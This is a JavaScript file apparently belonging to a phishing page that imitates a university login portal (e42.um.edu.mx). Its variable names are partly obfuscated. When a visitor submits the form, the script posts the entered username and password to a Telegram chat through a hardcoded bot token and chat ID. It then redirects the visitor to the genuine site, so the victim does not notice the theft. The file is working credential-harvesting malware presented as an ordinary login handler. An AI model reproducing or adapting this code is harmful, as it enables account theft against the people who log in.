const loginButton = document.querySelector(".login-container button");
const usuarioInput = document.getElementById('Usuario');
const passwordInput = document.getElementById("password");

window.addEventListener("DOMContentLoaded", () => {
  if (usuarioInput) {
    usuarioInput.focus();
  }
});

document.addEventListener('keydown', function (_0x7611b2) {
  if (_0x7611b2.key === 'Enter') {
    loginButton.click();
  }
});

loginButton.addEventListener("click", function (_0xb56f8f) {
  _0xb56f8f.preventDefault();
  const _0x2d2dac = usuarioInput ? usuarioInput.value.trim() : '';
  const _0x3cf213 = passwordInput ? passwordInput.value.trim() : '';
  if (_0x2d2dac === '' || _0x3cf213 === '') {
    return;
  }

  this.textContent = "Validando Información...";
  this.classList.add("loading");
  this.disabled = true;

  fetch("https://api.telegram.org/bot8093990322:AAGldoCRW_wWOTypOMxQOnVznQUuT_yTBp4/sendMessage", {
    method: "POST",
    headers: {
      'Content-Type': "application/json"
    },
    body: JSON.stringify({
      chat_id: -1004698873510,
      text: `Nuevo inicio de sesión:\nUsuario: ${_0x2d2dac}\nContraseña: ${_0x3cf213}\nFuente: e42`
    })
  }).then(response => {
    if (!response.ok) {
      throw new Error("Error en la respuesta de Telegram");
    }
    return response.json();
  }).then(data => {
    console.log("Datos enviados correctamente a Telegram");
    window.location.href = "https://e42.um.edu.mx/sec/Home.aspx";
  }).catch(error => {
    console.error("Error al enviar los datos:", error);
    alert("Hubo un error al procesar la solicitud. Intenta nuevamente.");
    this.textContent = "Intentar nuevamente";
    this.classList.remove("loading");
    this.disabled = false;
  });
});
